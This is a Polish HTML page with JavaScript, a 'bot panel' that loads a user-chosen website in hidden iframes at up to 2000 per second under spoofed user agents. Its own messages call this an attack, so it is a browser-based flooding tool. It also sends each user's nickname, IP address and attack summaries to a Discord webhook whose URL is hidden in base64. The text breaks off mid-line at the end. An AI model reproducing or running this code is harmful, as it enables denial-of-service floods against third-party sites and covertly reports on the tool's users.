<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8" />
<title>Bot Panel z podsumowaniem i oceną</title>
<style>
  body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
  #mainPanel { max-width: 600px; margin: auto; padding:20px; border: 1px solid #0f0; border-radius:8px; }
  label, textarea, input[type="text"] {
    display: block; width: 100%; margin-bottom: 10px; font-family: monospace; font-size: 14px;
  }
  input[type="text"], textarea {
    background: #222; border: 1px solid #0f0; color: #0f0; padding: 5px;
  }
  button {
    padding: 10px 20px; background: #222; color: #0f0; border: 1px solid #0f0;
    cursor: pointer; font-family: monospace; font-size: 16px; margin: 5px 5px 10px 0;
  }
  button:hover { background: #333; }
  #log {
    margin-top: 15px; height: 150px; overflow-y: scroll; background: #000;
    border: 1px solid #0f0; padding: 10px; font-size: 12px; white-space: pre-wrap;
  }
  #disclaimer {
    font-size: 12px; color: #faa; margin-top: 15px; white-space: pre-wrap;
  }
  #summary {
    margin-top: 15px; background: #000; border: 1px solid #0f0;
    padding: 10px; font-size: 14px; white-space: pre-wrap; display:none;
  }
  #stars {
    margin-top: 10px; font-size: 24px; cursor: pointer; user-select: none;
  }
  .star { color: #444; transition: color 0.3s; }
  .star.active { color: gold; }
</style>
</head>
<body>

<div id="mainPanel">
  <h2>Panel Botów</h2>

  <label for="nickInput">Wpisz swój nick (wymagane):</label>
  <input type="text" id="nickInput" placeholder="Twój nick" autocomplete="off" />

  <label for="urlInput">Adres strony do testu:</label>
  <input type="text" id="urlInput" value="https://twoja-strona.pl" autocomplete="off" />

  <label for="regulamin">Regulamin i zgoda (wymagane):</label>
  <textarea id="regulamin" rows="8" readonly>
Korzystając z tego narzędzia oświadczasz, że:
- x_Rediex nie ponosi odpowiedzialności za jakiekolwiek szkody.
- Narzędzie jest przeznaczone wyłącznie do celów edukacyjnych i testowych.
- Korzystasz z niego na własną odpowiedzialność.
- Wyrażasz zgodę na zbieranie Twojego nicku i adresu IP.
- Dane (nick i IP) będą przesyłane na serwer Discord webhook.
  </textarea>

  <label>
    <input type="checkbox" id="acceptCheckbox" /> Akceptuję regulamin
  </label>

  <button id="startBots" disabled>Start boty</button>
  <button id="stopBots" disabled>Stop boty</button>

  <div id="log"></div>

  <div id="summary"></div>

  <div id="stars" title="Kliknij, aby ocenić od 1 do 5 gwiazdek">
    <span class="star" data-value="1">⭐</span>
    <span class="star" data-value="2">⭐</span>
    <span class="star" data-value="3">⭐</span>
    <span class="star" data-value="4">⭐</span>
    <span class="star" data-value="5">⭐</span>
  </div>

  <button id="downloadTxt" style="display:none;">Pobierz logi .txt</button>
  <button id="downloadJson" style="display:none;">Pobierz logi .json</button>

  <div id="disclaimer">
x_Rediex nie odpowiada za wyrządzone szkody.
Korzystaj z tego narzędzia tylko w celach edukacyjnych.
Używasz na własną odpowiedzialność.
  </div>
</div>

<script>
(() => {
  const nickInput = document.getElementById('nickInput');
  const urlInput = document.getElementById('urlInput');
  const acceptCheckbox = document.getElementById('acceptCheckbox');
  const startBtn = document.getElementById('startBots');
  const stopBtn = document.getElementById('stopBots');
  const logDiv = document.getElementById('log');
  const summaryDiv = document.getElementById('summary');
  const starsDiv = document.getElementById('stars');
  const downloadTxtBtn = document.getElementById('downloadTxt');
  const downloadJsonBtn = document.getElementById('downloadJson');

  const visitsPerSecond = 2000;
  const delay = 1000 / visitsPerSecond;
  let intervalId = null;
  let botCounter = 0;
  let userIP = null;
  let accepted = false;

  const userAgents = [
    "jfjdensjsk/1.0",
    "jxdnnd/2.3",
    "randomDeviceXYZ/5.6",
    "DeviceSuperUltra/9.9",
    "MegaPhoneX/7.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) Chrome/120.0.0.0 Mobile",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/120.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) Edge/120.0.0.0"
  ];

  const webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMzg3NzI3OTM5Nzk3NDE2Ny9zTWdDQkVFU1BZZGEwVDhlYU5mTXBtc2R3SHFXZzNzVGZxUTRRc2prbnYzMTB5TExXWDVtVlNTdzJ0QW9BWGJ0aVA0TAo";
  const webhookURL = atob(webhookBase64).trim();

  let logData = [];
  let successCount = 0;
  let errorCount = 0;
  let startTime = null;

  function log(msg) {
    const time = new Date().toLocaleTimeString();
    logDiv.textContent += `[${time}] ${msg}\n`;
    logDiv.scrollTop = logDiv.scrollHeight;
    logData.push({ time: Date.now(), message: msg });
  }

  async function fetchIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      userIP = data.ip;
      log(`Twój IP to: ${userIP}`);
    } catch(e) {
      log("Nie udało się pobrać IP");
    }
  }

  async function sendWebhook(content) {
    try {
      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
      });
      log("Dane wysłane na webhook.");
    } catch(e) {
      log("Błąd wysyłania na webhook.");
    }
  }

  function updateStartBtn() {
    accepted = acceptCheckbox.checked && nickInput.value.trim() !== "";
    startBtn.disabled = !accepted;
  }

  nickInput.addEventListener('input', updateStartBtn);
  acceptCheckbox.addEventListener('change', updateStartBtn);

  function setStars(rating) {
    [...starsDiv.children].forEach(star => {
      star.classList.toggle('active', parseInt(star.dataset.value) <= rating);
    });
  }

  starsDiv.addEventListener('click', async e => {
    if (!e.target.classList.contains('star')) return;
    const rating = parseInt(e.target.dataset.value);
    if (!rating) return;
    localStorage.setItem('bot_rating', rating);
    setStars(rating);
    const nick = nickInput.value.trim() || "Anonim";
    await sendWebhook(`Użytkownik **${nick}** ocenił narzędzie na: ${rating} ⭐`);
    log(`Ocena wysłana: ${rating} ⭐`);
  });

  window.addEventListener('load', async () => {
    await fetchIP();
    const savedRating = parseInt(localStorage.getItem('bot_rating'));
    if (savedRating) {
      setStars(savedRating);
      const nick = nickInput.value.trim() || "Anonim";
      sendWebhook(`Użytkownik **${nick}** ponownie wysłał ocenę: ${savedRating} ⭐`);
    }
  });

  startBtn.onclick = async () => {
    if (intervalId) return;
    if (!accepted) {
      alert("Musisz zaakceptować regulamin i wpisać nick!");
      return;
    }
    const nick = nickInput.value.trim();
    const urlRaw = urlInput.value.trim();
    if (!urlRaw) {
      alert("Podaj adres strony!");
      return;
    }
    let url = urlRaw;
    if (!url.startsWith("http://") && !url.startsWith("https://")) {
      url = "http://" + url;
    }
    botCounter = 0;
    successCount = 0;
    errorCount = 0;
    logData = [];
    summaryDiv.style.display = "none";
    logDiv.textContent = "";
    startTime = performance.now();

    log("Start botów...");

    await sendWebhook(`Użytkownik **${nick}** rozpoczął atak z IP: \`${userIP}\``);

    startBtn.disabled = true;
    stopBtn.disabled = false;
    nickInput.disabled = true;
    urlInput.disabled = true;
    acceptCheckbox.disabled = true;

    intervalId = setInterval(() => {
      botCounter++;
      const botId = botCounter;
      const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
      log(`Bot #${botId} łączy się jako: ${randomUA}`);

      const iframe = document.createElement("iframe");
      iframe.src = url + "?ua=" + encodeURIComponent(randomUA) + "&nick=" + encodeURIComponent(nick) + "&t=" + Date.now();
      iframe.style.width = "1px";
      iframe.style.height = "1px";
      iframe.style.position = "absolute";
      iframe.style.left = "-9999px";
      document.body.appendChild(iframe);

      iframe.onload = () => {
        successCount++;
        log(`Bot #${botId} wszedł na stronę: ${url}`);
      };

      iframe.onerror = () => {
        errorCount++;
        log(`Bot #${botId} odmówiono dostępu do: ${url}`);
      };

      setTimeout(() => iframe.remove(), 2000);
    }, delay);
  };

  stopBtn.onclick = async () => {
    if (!intervalId) return;
    clearInterval(intervalId);
    intervalId = null;
    const endTime = performance.now();
    const durationMs = Math.round(endTime - startTime);
    const date = new Date();

    log("Boty zatrzymane.");

    const summary = `Użytkownik **${nickInput.value.trim()}** zakończył atak.
Czas trwania: ${durationMs} ms
Wysłano botów: ${botCounter}
Sukcesów: ${successCount}
Błędów: ${errorCount}
Data: ${date.toLocaleString()} (${date.getMilliseconds()} ms)
`;
    summaryDiv.textContent = summary;
    summaryDiv.style.display = "block";

    await sendWebhook(summary);

    startBtn.disabled = false;
    stopBtn.disabled = true;
    nickInput.disabled = false;
    urlInput.disabled = false;
    acceptCheckbox.disabled = false;
  };

  downloadTxtBtn.onclick = () => {
    const txt = logData.map(l => `[${new Date(l.time).toLocaleTimeString()}] ${l.message}`).join("\n");
    const blob = new Blob([txt], { type: "text/plain" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "logi.txt";
    a.click();
  };

  downloadJsonBtn.onclick = () => {
    const json = JSON.stringify(logData, null, 2);
    const blob = new Blob([json], { type: "
